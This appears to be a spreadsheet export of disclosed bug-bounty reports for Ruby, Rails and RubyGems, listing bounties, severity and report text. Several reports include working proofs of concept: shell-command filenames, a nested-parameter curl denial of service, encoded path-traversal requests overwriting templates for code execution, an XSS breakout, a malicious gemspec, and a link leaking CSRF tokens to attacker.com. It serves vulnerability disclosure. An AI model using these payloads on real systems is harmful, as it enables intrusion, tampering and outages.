  https://www.ruby-lang.org/en/news/2021/07/07/trusting-pasv-responses-in-net-ftp/
Thank you.shugo Ruby staff  requested to disclose this report. Jul 8th (about 1 year ago)The Internet Bug Bounty  rewarded chinarulezzz with a $500 bounty. Jul 8th (about 1 year ago)chinarulezzz   agreed to disclose this report. Jul 8th (about 1 year ago)  This report has been disclosed. Jul 8th (about 1 year ago)",https://hackerone.com/reports/1145454,No value,No value,No value,2021,4,2,15,56
Ruby,501-1000,1.0,No value,"$1,000.00",Low,2.0,Command Injection - Generic,NET::Ftp allows command injection in filenames,"staaldraad  submitted a report to Ruby.Dec 2nd (5 years ago)Hi
While using NET::Ftp I realised you could get command execution through ""malicious"" file names. 
The problem lies in the gettextfile(remotefile, localfile = File.basename(remotefile)) method.
When looking at the source code, you'll note:
Code 275 BytesWrap lines Copy Download1def gettextfile(remotefile, localfile = File.basename(remotefile),
2                &block) # :yield: line
3  f = nil
4  result = nil
5  if localfile
6    f = open(localfile, ""w"") # Vulnerable code here. open(""| os command"",""w"")
7  elsif !block_given?
8    result = String.new
9  end
The localfile value will trigger command execution if the value is | os command. In general use, most users would likely provide their own localfile value and would not rely on the default of File.basename(remotefile); however, in some situations, such as listing and downloading all files in a FTP share, the remotefile value would be controlled by the remote host and could thus be manipulated into causing RCE. Since the file path is simply a string returned by the server (either ls -l style for the LIST command, or filenames for NLIST), there is no need/guarantee that filename will be a valid filename.
I have attached a sample server that can be used to trigger this vulnerability, as well as a sample client which is vulnerable.
Usage:
Change the host and port values in both ftpserver.rb and client.rb
Start the server: ruby ftpserver.rb
Run the client: ruby client.rb
Observe that a new file has been created in the CWD of the client.rb. The file will be called pang and contain the output of the id command. As seen in screenshot1.png
The provided attack example is a little contrived and assumes the user is accepting the file names provided by the server, rather than their own. However, since there is no clear indication in the documentation or an expectation that filenames could lead to RCE, users may be caught unaware. It would probably be best to not use open in NET::Ftp, but rather something like File.open, maintaining both expected behaviour and security.
Impact
Remote code execution through command injection. As a user of the NET::Ftp is expecting normal file creation behaviour, they might not be sanitising file paths.3 attachments:F243804: screenshot1.pngF243806: client.rbF243807: ftpserv.rb",https://hackerone.com/reports/294462,No value,No value,No value,2017,12,2,11,33
Ruby,501-1000,1.0,No value,$500.00,High,7.95,Improper Authentication - Generic,Open S3 Bucket WriteAble To Any Aws User,"injector404  submitted a report to Ruby.Feb 27th (6 years ago)Hi All,
I know that http://rubyci.s3.amazonaws.com is used for file uploads on reports and so when i open your s3 bucket i able see all of your public/private files i already see you fix this vulnerability but it not completely fixed
	root@injector:~# aws s3 ls s3://rubyci
PRE aix71_ppc/
PRE amazon/
PRE arch/
PRE archive/
PRE armv8b/
PRE c64b/
PRE centos5-32/
PRE centos5-64/
PRE centos7/
PRE debian/
PRE debian7/
PRE debian8/
PRE f19p8/
PRE fedora20/
PRE fedora21/
PRE fedora22/
PRE fedora23/
PRE fedora24/
PRE fedora25/
PRE freebsd10-zfs/
PRE freebsd11zfs/
PRE freebsd82-32/
PRE freebsd82-64/
PRE funtoo/
PRE gentoo/
PRE icc-x64/
PRE opensuse13/
PRE opensuseleap/
PRE osx1010/
PRE osx1011/
PRE rhel_zlinux/
PRE scw-9d6766/
PRE tk2-243-31075/
PRE ubuntu/
PRE ubuntu1004-32/
PRE ubuntu1004-64/
PRE ubuntu1404/
PRE ubuntu1410/
PRE ubuntu1510/
PRE ubuntu1604/
PRE unstable10s/
PRE unstable10x/
PRE unstable11s/
PRE unstable11x/
2017-02-17 13:03:14        112 test.html
2017-02-27 09:52:15         20 test.txt
any one who have aws s3 cli can write in your bucket because your bucket writable through aws cli
when i try to move and delete any file on your bucket i got this
###MOVED
root@injector:~# aws s3 mv test.txt s3://rubyci
move: ./test.txt to s3://rubyci/test.txt
###DELETED
root@injector:~# aws s3 rm s3://rubyci/test.txt
delete: s3://rubyci/test.txt
any one using aws cli can move and delete any file from your bucket
also check the attached picture and feel free to contact if you need any additional info
Best Regard
Saad Ahmed4 attachments:F164412: DELETE.pngF164413: MOVE.pngF164414: open_Bucket.pngF164415: LIST_DIR.png",https://hackerone.com/reports/209223,No value,No value,No value,2017,2,27,5,3
Ruby,501-1000,1.0,No value,$500.00,Medium,5.45,Improper Certificate Validation,"OpenSSL::X509::Name Equality Check Does Not Work, Patch included","tylereckstein  submitted a report to Ruby.Jul 26th (4 years ago)When two OpenSSL::X509::Name objects are compared using ==, depending on the ordering, non-equal objects will return true. When the first argument is one character longer than the second, or the second argument contains a character that is one less than a character in the same position of the first argument, the result of == will be true. Example below:
irb(main):001:0> require 'openssl'
=> true
irb(main):002:0> a = OpenSSL::X509::Name.new([[""CN"", ""www.example.com""]])
=> #<OpenSSL::X509::Name:0x007fa127cdf3f0>
irb(main):003:0> b = OpenSSL::X509::Name.new([[""CN"", ""www.example.co""]])
=> #<OpenSSL::X509::Name:0x007fa127cd0260>
irb(main):004:0> c = OpenSSL::X509::Name.new([[""CN"", ""www.exbmple.com""]])
=> #<OpenSSL::X509::Name:0x007fa127cb68b0>
irb(main):005:0> a == b
=> true                    # Should NOT be true
irb(main):006:0> a == c
=> false
irb(main):007:0> c == a
=> true                    # Should NOT be true
irb(main):008:0> b == a
=> false
This appears to be from the ossl_x509name_cmp function and I was able to fix this with the following diff, with included tests that would fail without the change to ossl_x509name_cmp:
diff --git a/ext/openssl/ossl_x509name.c b/ext/openssl/ossl_x509name.c
index c900bcb..15e4bb0 100644
--- a/ext/openssl/ossl_x509name.c
+++ b/ext/openssl/ossl_x509name.c
@@ -400,7 +400,7 @@ ossl_x509name_cmp(VALUE self, VALUE other)
     result = ossl_x509name_cmp0(self, other);
if (result < 0) return INT2FIX(-1);

if (result > 1) return INT2FIX(1);



if (result > 0) return INT2FIX(1);
     return INT2FIX(0);
}
diff --git a/test/test_x509name.rb b/test/test_x509name.rb
index 2d92e64..ae8a8fb 100644
--- a/test/test_x509name.rb
+++ b/test/test_x509name.rb
@@ -426,10 +426,24 @@ class OpenSSL::TestX509Name < OpenSSL::TestCase
name0 = OpenSSL::X509::Name.new([[""DC"", ""org""], [""DC"", ""ruby-lang""], [""CN"", ""bar.ruby-lang.org""]])
name1 = OpenSSL::X509::Name.new([[""DC"", ""org""], [""DC"", ""ruby-lang""], [""CN"", ""bar.ruby-lang.org""]])
name2 = OpenSSL::X509::Name.new([[""DC"", ""org""], [""DC"", ""ruby-lang""], [""CN"", ""baz.ruby-lang.org""]])


name3 = OpenSSL::X509::Name.new([[""DC"", ""org""], [""DC"", ""ruby-lang""], [""CN"", ""bar.ruby-langg.org""]])


name4 = OpenSSL::X509::Name.new([[""DC"", ""org""], [""DC"", ""ruby-lang""], [""CN"", ""bbz.ruby-lang.org""]])
assert_equal true, name0 == name1
assert_equal true, name0.eql?(name1)


assert_equal true, name1 == name0


assert_equal true, name1.eql?(name0)
assert_equal false, name0 == name2
assert_equal false, name0.eql?(name2)


assert_equal false, name2 == name0


assert_equal false, name2.eql?(name0)


assert_equal false, name0 == name3


assert_equal false, name0.eql?(name3)


assert_equal false, name3 == name0


assert_equal false, name3.eql?(name0)


assert_equal false, name0 == name4


assert_equal false, name0.eql?(name4)


assert_equal false, name4 == name0


assert_equal false, name4.eql?(name0)
end


Impact
Whenever names are compared during certificate validation an attacker could use a certificate with a different name, but the comparison will return that they are equal. This would allow an attacker to create an illegitimate certificate that may be accepted as legitimate and then used in signing or encryption operations.",https://hackerone.com/reports/387250,No value,No value,No value,2018,7,26,17,24
Ruby,501-1000,1.0,No value,$500.00,Medium,6.4,OS Command Injection,OS Command Injection in 'rdoc' documentation generator,"chinarulezzz  submitted a report to Ruby.Apr 12th (2 years ago)Details:
If the remove_unparseable function  receives a list of files with a command in the name of one of them, it will be executed.
Just enough the name to match the pattern. The problem code:
Code 267 BytesWrap lines Copy Download1  def remove_unparseable files
2    files.reject do |file, *|
3      file =~ /\.(?:class|eps|erb|scpt\.txt|svg|ttf|yml)$/i or
4        (file =~ /tags$/i and
5         open(file, 'rb') { |io|
6           io.read(100) =~ /\A(\f\n[^,]+,\d+$|!_TAG_)/
7         })
8    end
9  end
PoC
Code 511 BytesWrap lines Copy Download1$ touch '| touch evil.txt && echo tags'
2$ ls
3'| touch evil.txt && echo tags'
4$ rdoc --all
5Parsing sources...
6100% [ 1/ 1]  | touch evil.txt && echo tags
7
8Generating Darkfish format into /home/tmp/doc...
9
10  Files:      1
11
12  Classes:    0 (0 undocumented)
13  Modules:    0 (0 undocumented)
14  Constants:  0 (0 undocumented)
15  Attributes: 0 (0 undocumented)
16  Methods:    0 (0 undocumented)
17
18  Total:      0 (0 undocumented)
19    0.00% documented
20
21  Elapsed: 0.1s
22
23$ ls
24doc   evil.txt  '| touch evil.txt && echo tags'
I set to the vulnerability the same severity as in https://hackerone.com/reports/651518, since rdoc is widely used on dev/production systems and, therefore, the attack also has a wide range of applications.  An attacker can hide a bad-named-file deep in the project structure to be stealthy some time.
Impact
An attacker can leverage this weakness to execute arbitrary commands, disclose sensitive information and cause denial of service.",https://hackerone.com/reports/1161691,No value,No value,No value,2021,4,12,16,47
Ruby,501-1000,1.0,No value,$200.00,No value,0.0,OS Command Injection,OS Command Injection via egrep in Rake::FileList,"kyoshida  submitted a report to Ruby.Jul 20th (3 years ago)When a file which has command file name of stating with | is in Rake::FileList, then egrep will execute the command.
How to reproduce
PoC (poc_rake.rb) is the following.
Code 87 BytesWrap lines Copy Download1require 'rake'
2
3list = Rake::FileList.new(Dir.glob('*'))
4p list
5list.egrep(/something/)
Example of executing.
Code 355 BytesWrap lines Copy Download1% ls -1
2Gemfile
3Gemfile.lock
4poc_rake.rb
5vendor
6| touch evil.txt
7% bundle exec ruby poc_rake.rb
8[""poc_rake.rb"", ""Gemfile"", ""Gemfile.lock"", ""| touch evil.txt"", ""vendor""]
9poc_rake.rb:6:list.egrep(/something/)
10Error while processing 'vendor': Is a directory @ io_fillbuf - fd:7 vendor
11% ls -1
12Gemfile
13Gemfile.lock
14evil.txt
15poc_rake.rb
16vendor
17| touch evil.txt
evil.txt was created.
Impact
An attacker must deploy a file containing command names in the target environment, assuming that this attack is successful. If that would be a serious problem.",https://hackerone.com/reports/651518,No value,No value,No value,2019,7,20,4,16
Ruby on Rails,11-50,1.0,1m-10m,"$1,500.00",No value,0.0,None,Active Record SQL Injection Vulnerability Affecting PostgreSQL,"seantheprogrammer  submitted a report to Ruby on Rails.Jul 2nd (8 years ago)This vulnerability was reported directly to Rails.
https://groups.google.com/forum/#!msg/rubyonrails-security/wDxePLJGZdI/WP7EasCJTA4J",https://hackerone.com/reports/28450,West Bengal,India,Kolkata,2014,7,2,0,0
Ruby on Rails,11-50,1.0,1m-10m,"$1,000.00",No value,0.0,None,Arbitrary file existence disclosure in Action Pack,nahamsec  submitted a report to Ruby on Rails.Nov 4th (8 years ago)This bug was reported directly to the Rails team: https://groups.google.com/forum/#!topic/rubyonrails-security/23fiuwb1NBA,https://hackerone.com/reports/43440,West Bengal,India,Kolkata,2014,11,4,0,0
Ruby on Rails,11-50,1.0,1m-10m,"$2,000.00",No value,0.0,Cross-site Scripting (XSS) - Generic,Data-Tags and the New HTML Sanitizer Subverts CSRF protection,benmmurphy  submitted a report to Ruby on Rails.Jan 7th (8 years ago),https://hackerone.com/reports/42728,West Bengal,India,Kolkata,2015,1,7,0,38
Ruby on Rails,11-50,1.0,1m-10m,"$1,500.00",No value,0.0,Denial of Service,Denial of Service in Action Pack Exception Handling,"ff7f00  submitted a report to Ruby on Rails.Jan 7th (8 years ago)Severity
Medium
Impact
Attackers can cause an application to be unreachable, causing a denial of service condition.
Details
When a Rails application receives a request with either body or query parameters, these parameters are converted to a params hash. Hashes can be passed to the application in the form of user[name]=foo&user[address]=bar. Action Pack will then convert this into a hash in the form of { user[:name] => ""foo"", user[:address] => ""bar"" }. By passing a very large nested hash in the form of nested_hash[X1][X2]...[Xn], it is possible to create a denial of service condition in the form of a SystemStackError that is not handled properly. See the Bug Notes section on my attempt to figure out where this is occurring.
This was tested in the latest Rails 4.2.0 release with Ruby versions ruby-1.9.3-p551, 2.1.5p273, and ruby 2.2.0p0.
Production Webrick and single threaded Thin servers can be taken out with a single request. I set Burp Suite to a high number of concurrent requests and was able to get Heroku to produce a generic application unavailable message on a production application I had hosted, so Unicorn will be effected as well with workers constantly dying and being relaunched.
Bug Notes
It seems that the initial SystemStackError is thrown during normalize_encode_params(params) in actionpack/lib/action_dispatch/http/parameters.rb, Line 47. This method is then called again during the logging/creating of the exception when the logging code attempts to normalize and encode the parameters again. It's possible that a loop is being hit here every time the SystemStackError occurs.
I set a byebug break point in the GET and POST methods located at actionpack/lib/action_dispatch/http/request.rb, line 299, then set 'catch SystemStackError'. The SystemStackError is raised 2 more times before finally running out of resources and hanging the process. The normalize_encode_params is a recursive method that creates a new hash in a block before calling itself so I believe a lot of resources are being allocated for this method when it gets deep into the nested hash.
Reproduction Steps
For Webrick:

rails new dos_test
cd dos_test
bundle exec rails generate controller welcome index
Uncomment the root 'welcome#index' line in config/routes.rb
SECRET_KEY_BASE='foo' bundle exec rails s -e production
Then in a separate window, run the following cURL command:

Code 1.41 KiBWrap lines Copy Download1curl -i -s -k  -X 'GET' \
2-H 'Content-Type: application/x-www-form-urlencoded' \
3--data-binary $'foo[a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a]=bar' \
4'http://localhost:3000/'
Note that Webrick will hang and will have to be killed manually. If the Webrick server handles this level of nesting, more nesting levels can be created by adding [a] until the application hangs.
If you have any questions at all or need clarification, I’d be happy to help.",https://hackerone.com/reports/42797,West Bengal,India,Kolkata,2015,1,7,20,1
Ruby on Rails,11-50,1.0,1m-10m,"$1,500.00",No value,0.0,Information Disclosure,Directory traversal attack in view resolver,"lautis  submitted a report to Ruby on Rails.Mar 6th (9 years ago)There seems to be two cases that allow directory traversal when using wildcard URL segments that allow rendering view outside view paths.
For example, let say there is a route
	get '/help/(*action)’, controller: ‘help’
and a matching controller
	class HelpController < ApplicationController
end
This renders all views that are in 'app/views/help’ (assuming default view paths) even when matching action method is not defined.
If an attacker made a request GET /help/../../../Gemfile, ActionView::FileSystemResolver returns Gemfile from project root as the matching view. This simple case can be prevented using Rack::Protection::PathTraversal middleware, but it is not enabled by default in Rails. Also, there could be other mechanisms that may result in rendering views that are outside view path. Not sure if that’s the expected behaviour, but this surprised me.
However, Rack::Protection::PathTraversal can be bypassed using backslashes: GET /help/%5c../%5c../%5c../Gemfile. The resolver uses Dir.glob, which escapes backslashes unless File::FNM_NOESCAPE flag is used. Rack::Protection::PathTraversal won’t intercept '\../' and the resolver treats '\../' as '../'.
Attached are fixes for the mentioned vulnerabilities with test cases.2 attachments:F4047: 0001-Do-not-escape-backslashes-in-view-paths.patchF4048: 0002-Ensure-that-templates-are-within-view-paths.patch",https://hackerone.com/reports/3370,West Bengal,India,Kolkata,2014,3,6,11,13
Ruby on Rails,11-50,1.0,1m-10m,$500.00,High,8.6,Code Injection,"Explicit, dynamic render path: Dir. Trav + RCE",forced-request  submitted a report to Ruby on Rails.Feb 1st (8 years ago),https://hackerone.com/reports/46019,West Bengal,India,Kolkata,2015,2,1,14,34
Ruby on Rails,11-50,1.0,1m-10m,"$1,000.00",High,7.95,Path Traversal,File writing by Directory traversal at actionpack-page_caching and RCE by it,"ooooooo_q  submitted a report to Ruby on Rails.Mar 31st (4 years ago)I found a directory traversal in actionpack-page_caching.
Some code may lead to RCE.
https://github.com/rails/actionpack-page_caching/blob/master/lib/action_controller/caching/pages.rb#L143
Code 384 BytesWrap lines Copy Download1  def cache_file(path, extension)
2    if path.empty? || path =~ %r{\A/+\z}
3      name = ""/index""
4    else
5      name = URI.parser.unescape(path.chomp(""/""))
6    end
7
8    if File.extname(name).empty?
9      name + (extension || default_extension)
10    else
11      name
12    end
13  end
14
15  def cache_path(path, extension = nil)
16    File.join(cache_directory, cache_file(path, extension))
17  end
The problem is that traversal is not considered in cache_path or cache_file.
Since the URL can use . or/encoded values, the cache will be written in an unexpected place.
PoC
step 1. Prepare server
Code 193 BytesWrap lines Copy Download1ruby -v
2
3rails -v
4
5rails new caching_traversal
6
7cd caching_traversal
8
9# add `gem ""actionpack-page_caching""` in Gemfile
10
11bundle install
12
13rails generate scaffold book name:string
14rails db:migrate
step 2. Setting cache
Enable caching.
Code 15 BytesWrap lines Copy Download1rails dev:cache
Add caches_page.
Code 171 BytesWrap lines Copy Download1# app/controllers/books_contorller.rb
2class BooksController < ApplicationController
3  before_action :set_book, only: [:show, :edit, :update, :destroy]
4
5  caches_page :show
step 3. Start server
Start the server with ""rails s"".
Prepare a book with the following name.
Code 17 BytesWrap lines Copy Download1<% `toouch me` %>
Check cache behavior.
Code 400 BytesWrap lines Copy Download1❯ curl ""http://localhost:3000/books/1""
2<!DOCTYPE html>
3...
4<p>
5  <strong>Name:</strong>
6  &lt;% `touch me` %&gt;
7</p>
8...
9
10❯ ls public
11404.html  500.html                          apple-touch-icon.png  favicon.ico
12422.html  apple-touch-icon-precomposed.png  books                 robots.txt
13
14❯ cat public/books/1.html
15<!DOCTYPE html>
16...
17<p>
18  <strong>Name:</strong>
19  &lt;% `touch me` %&gt;
20</p>
21...
22
step 4. Attack
Add an attack code to the pass and check the result.
Code 494 BytesWrap lines Copy Download1❯ curl ""http://localhost:3000/books/1%2f%2e%2e%2f%2e%2e%2f%2e%2e%2ftest""
2
3# test file is generated
4❯ ls
5app  config     db       Gemfile.lock  log           public    README.md  test       tmp
6bin  config.ru  Gemfile  lib           package.json  Rakefile  storage    test.html  vendor
7
8
9❯ curl ""http://localhost:3000/books/1%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fREADME%2emd""
10
11# If the file exists it will be overwritten
12❯ cat README.md
13...
14<p>
15  <strong>Name:</strong>
16  &lt;% `touch me` %&gt;
17</p>
18...
step 5. RCE
RCE is possible if it is possible to create a cache where the value of <% is not escaped, like render for text.
Generate the file app/views/books/show.text.erb as follows:
Code 24 BytesWrap lines Copy Download1name: <%= @ book.name %>
Overwriting erb files enables RCE.
Code 498 BytesWrap lines Copy Download1# overwrite erb
2❯ curl ""http://localhost:3000/books/1%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fapp%2fviews%2fbooks%2fshow%2etext%2eerb?format=text""
3name: <% `touch me` %>
4
5❯ cat app/views/books/show.text.erb
6name: <% `touch me` %>
7
8
9# executed `touch me`
10❯ curl ""http://localhost:3000/books/1.txt""
11name:
12
13# me file is generated
14❯ ls
15app  config     db       Gemfile.lock  log  package.json  Rakefile   storage  test.html  vendor
16bin  config.ru  Gemfile  lib           me   public        README.md  test     tmp
Impact
The cache is generated on an unintended path. Also, RCE may be possible.",https://hackerone.com/reports/519220,West Bengal,India,Kolkata,2019,3,31,7,25
Ruby on Rails,11-50,1.0,1m-10m,"$1,500.00",No value,0.0,Improper Authentication - Generic,http_basic_authenticate_with is suseptible to timing attacks.,d_w  submitted a report to Ruby on Rails.Oct 19th (7 years ago),https://hackerone.com/reports/94568,West Bengal,India,Kolkata,2015,10,19,11,1
Ruby on Rails,11-50,1.0,1m-10m,$500.00,High,7.2,Cross-site Scripting (XSS) - Generic,JSON keys are not properly escaped,"einstein_  submitted a report to Ruby on Rails.Feb 10th (8 years ago)Rails does not escape hash keys properly in to_json when generating json.
Values are escaped as expected
Code 68 BytesWrap lines Copy Download1irb(main):001:0> {""a""=>""<>""}.to_json
2=> ""{\""a\"":\""\\u003c\\u003e\""}""
However keys are not:
Code 56 BytesWrap lines Copy Download1irb(main):002:0> {""<>""=>""a""}.to_json
2=> ""{\""<>\"":\""a\""}""
This is because the json gem calls .to_s on the keys here which transforms the EscapedString back into a simple String so it doesn't go through the escaping process that values go through here.
Security consideration: this issue is a vector for XSS when an arbitrary value is used as a key and reflected in a javascript tag. Consider this piece of code:
Code 43 BytesWrap lines Copy Download1javascript_tag ""var json=#{params.to_json}""
When params is something like {""</script><script>alert(1)//""=>""xss""} then <> are not escaped as they should and the javascript tag looks like this:
Code 83 BytesWrap lines Copy Download1<script>
2//<![CDATA[
3var json={""</script><script>alert(1)//"":""xss""}
4//]]>
5</script>
The </script> inside the json object will terminate the opening script tag because it has precedence over everything else, and alert(1) is executed.
I believe this issue also applies to 4.2-stable and master.
Note that I opened a PR for a related issue in the json gem (https://github.com/flori/json/pull/235) which occurs when ActiveSupport.escape_html_entities_in_json = false because the forward slash is never escaped (neither in rails nor in the json gem). It might be worth fixing this in rails as well.",https://hackerone.com/reports/47280,West Bengal,India,Kolkata,2015,2,10,1,0
Ruby on Rails,11-50,1.0,1m-10m,$500.00,High,7.2,None,"Nested attributes reject_if proc can be circumvented by providing ""_destroy"" parameter",jcoyne  submitted a report to Ruby on Rails.Sep 25th (7 years ago)pixeltrix Ruby on Rails staff  posted a comment. Nov 27th (7 years ago)rafaelfranca Ruby on Rails staff  changed the status to Triaged. Jan 25th (7 years ago)jcoyne   posted a comment. Jan 25th (7 years ago)rafaelfranca Ruby on Rails staff  closed the report and changed the status to Resolved. Jan 26th (7 years ago)rafaelfranca Ruby on Rails staff  requested to disclose this report. Feb 12th (7 years ago)jcoyne   agreed to disclose this report. Feb 12th (7 years ago)  This report has been disclosed. Feb 12th (7 years ago)rafaelfranca Ruby on Rails staff  updated the severity to high (7.2). Dec 5th (5 years ago)The Internet Bug Bounty  rewarded jcoyne with a $500 bounty. Dec 5th (5 years ago),https://hackerone.com/reports/90457,West Bengal,India,Kolkata,2015,9,25,15,35
Ruby on Rails,11-50,1.0,1m-10m,"$1,500.00",Medium,5.8,Path Traversal,Path Traversal on Default Installed Rails Application (Asset Pipeline),orange  submitted a report to Ruby on Rails.Jan 22nd (5 years ago),https://hackerone.com/reports/307808,West Bengal,India,Kolkata,2018,1,22,10,42
Ruby on Rails,11-50,1.0,1m-10m,"$2,000.00",No value,0.0,Cross-site Scripting (XSS) - Generic,Potential XSS on sanitize/Rails::Html::WhiteListSanitizer,garnu  submitted a report to Ruby on Rails.Aug 8th (7 years ago),https://hackerone.com/reports/81212,West Bengal,India,Kolkata,2015,8,8,9,37
Ruby on Rails,11-50,1.0,1m-10m,$500.00,No value,0.0,Code Injection,RCE due to Web Console IP Whitelist bypass in Rails 4.0 and 4.1,"joernchen  submitted a report to Ruby on Rails.Jan 21st (8 years ago)With the release of Ruby on Rails 4.2 the so called Web Console was introduced. 
As the Web Console documentation states:
Web Console is built explicitly for Rails 4.
By default the Web Console is available in the Rails Development Environment and allows only the IPs 127.0.0.1 and ::1 to access the console in order to evaluate arbitrary Ruby statements for the purpose of debugging.
However with Rails Versions 4.1 and 4.0 the Web Console built in IP whitelist is bypassable.
This is due to the fact that Web Console parses the request.remote_ip to check if the IP is whitelisted with the Ruby class IPAddr. The Rails stack prior to 4.2 when calculating request.remote_ip uses these regular expressions to strip out trusted Proxies from the HTTP Headers X-Forwarded-For and Client-IP.
Due to this parser differential an attacker might bypass the Web Console IP whitelist by supplying a HTTP header value of:
X-Forwarded-For: 0000::1 
This IPv6 address in the given notation would bypass the TRUSTED_PROXIES entry ^::1$ but match the IPAddr value of ::1 within Web Console.
As the Web Console is intended for debugging in the Development Environment this will most likely not affect Production setups, unless Web Console is explicitly enabled. But gaining RCE on Developer laptops might be fun as well ;).
I've already sent a description of this to the Rails Security Team via mail, but I've been asked to submit here again. 
The easiest mitigation of this issue would be to disallow execution of Web Console within Rails < 4.2.",https://hackerone.com/reports/44513,West Bengal,India,Kolkata,2015,1,21,12,51
Ruby on Rails,11-50,1.0,1m-10m,"$1,000.00",No value,0.0,Cross-Site Request Forgery (CSRF),rails-ujs will send CSRF tokens to other origins,"mastahyeti  submitted a report to Ruby on Rails.Mar 3rd (8 years ago)I reported this via email a few months ago. Here was my initial email:

Hello,
I've been playing with getting Rails apps to send CSRF tokens to the wrong domains and I found a few problems. The main motivation for this is in attacking a site that uses Content Security Policy. With CSP enabled, an attacker with an XSS vulnerability cannot simply inject inline JavaScript, but they can still abuse some Rails features to steal a CSRF token.
In the scenario where an attacker can inject arbitrary HTML into the response, the simplest attack would be to inject:
<a href=""https://attacker.com"" data-remote data-method=""post"" data-cross-domain=""false"">
Clicking on this link will trigger an OPTIONS request to attacker.com. If the attacker returns the correct CORS headers, a POST request containing the user's CSRF token will be sent to attacker.com.
In a second scenario, an attacker might be able to control only the href attribute of an anchor tag or the action attribute of a form tag that will trigger a data-remote action. This isn't uncommon to see if the site is building anchor or form tags dynamically. In this case, the attacker can set the href or action to "" https://attacker.com"". This will be passed to JQuery, who will see this as a same origin request.
The JQuery behavior can be found here and a similar bug in Zepto can be found here. In both these cases, weak regexes don't match the URL and the framework fails open into assuming that the URL is same origin. Prefixing the URL with a space character is one way to break this regex, but the regexes are pretty weak and there are probably other ways as well.
I'll contact the JQuery/Zepto folks about fixing their regexes, but there are a few thing that could improve this in jquery_ujs as well.
I don't think a data attribute (data-cross-domain) should be able to force jquery_ujs to send the CSRF token.
The href attribute should be accessed directly here rather than calling attr(""href""). When called directly, the browser does a lot to clean up the URL and make sure that it is well formed. This would address the space prefix issue.
Some stronger protections could be added before calling CSRFProtection here.
For links with data-method, but without data-remote, the origin isn't even checked before adding a CSRF token to the form. This could even be exploited accidentally. Origin checking should be added here
I haven't seen a bulletproof way for comparing origins yet, but I've got a few ideas if you want to discuss it more. Let me know what you think.
Thanks,
Ben Toews
GitHub Security",https://hackerone.com/reports/49935,West Bengal,India,Kolkata,2015,3,3,18,42
Ruby on Rails,11-50,1.0,1m-10m,"$1,500.00",No value,0.0,Code Injection,Regarding [CVE-2016-0752] Possible Information Leak Vulnerability in Action View,jyotisingh  submitted a report to Ruby on Rails.Feb 1st (7 years ago),https://hackerone.com/reports/113831,West Bengal,India,Kolkata,2016,2,1,10,0
RubyGems,1-10,1.0,No value,$500.00,Low,2.0,Command Injection - Generic,"Escape sequence injection in ""summary"" field","mame  submitted a report to RubyGems.May 5th (6 years ago)Seems we can include any escape sequence in the ""summary"" field of gemspec.  This allows attackers to inject escape sequences to a victim's terminal emulator.
How to attack
1) An attacker creates a gem with summary string that includes malicious escape sequences, and push it to rubygems.org.
2) A victim executes gem search attackers-gem -d, and the malicious string is printed in the terminal emulator.
In general, this is considered vulnerable.  I'd like you to read Terminal Emulator Security Issues in detail.  In short, an attacker can exploit this, not only to surprise a victim with a rainbow string, but also to inject malicious command to a victim's terminal, which may lead to abitrary code execution.  Ruby WEBrick also handled a similar issue as a vulnerability.
Proof of concept
1) Prepare the following gemspec.
Code 316 BytesWrap lines Copy Download1Gem::Specification.new do |spec|
2  spec.name     = ""escape-sequence-injection-vulnerability""
3  spec.version  = ""0.0.1""
4  spec.authors  = [""Yusuke Endoh""]
5  spec.email    = [""mame@ruby-lang.org""]
6  spec.summary  = ""foo\e[31mbar\e[0mbaz \e]2;BOOM!\a""
7  spec.homepage = ""http://example.com/""
8  spec.license  = ""MIT""
9end
2) Run the following commands
Code 119 BytesWrap lines Copy Download1gem build escape-sequence-injection-vulnerability.gemspec
2gem install escape-sequence-injection-vulnerability-0.0.1.gem
3) Run the following command.
Code 64 BytesWrap lines Copy Download1gem query escape-sequence-injection-vulnerability -d && sleep 10
You will see a summary line ""foobarbaz"" (with ""bar"" red), and its window title changed ""BOOM!"".",https://hackerone.com/reports/226335,No value,No value,No value,2017,5,5,13,35
RubyGems,1-10,1.0,No value,"$1,000.00",High,7.95,Path Traversal,Installing a crafted gem package may create or overwrite files,"mame  submitted a report to RubyGems.Jun 26th (5 years ago)There is no check for name field in metadata.gz.  By assigning a maliciously crafted string like ../../../../../any/where to the field, an attacker can create an arbitrary file out of the directory of the gem, or even replace an existing file with a malicious file.
Proof of Concept 1: Create a file anywhere
This PoC attempts to create a file /tmp/malicious-0/BOOOOM.
1) Download the attached file malicious.gem.
2) Run gem install malicious.gem --no-doc.
3) /tmp/malicious-0/BOOOOM should be created.
malicious.gem assigns ../../../../../../../../../../tmp/malicious as name field.  This attack is relatively weak since the path must include a directory named <name>-<version>, such as malicious-0.  Still, there are many chances that cause a catastrophe.  For example, think of replacing a file in /etc/dbus-1/.
Proof of Concept 2: Replace rackup command
